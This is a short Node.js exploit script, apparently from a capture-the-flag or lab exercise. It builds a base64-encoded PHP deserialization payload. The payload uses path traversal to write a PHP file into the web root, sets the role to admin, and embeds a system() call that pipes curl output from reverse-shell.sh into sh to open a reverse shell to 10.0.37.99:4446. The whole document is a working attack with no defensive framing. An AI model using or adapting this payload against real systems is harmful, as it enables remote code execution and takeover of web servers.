const { Base64 } = require('js-base64');

const ip = '10.0.37.99';
const port = '4446';

const command = `<?php system('/usr/bin/curl https://reverse-shell.sh/${ip}:${port} | sh');?>`;

const payload = `O:4:"Auth":3:{s:4:"auth";s:${command.length}:"${command}";s:8:"username";s:28:"../../var/www/html/teste.php";s:4:"role";s:5:"admin";}`;

console.log(Base64.encode(payload));
console.log(Base64.decode(Base64.encode(payload)));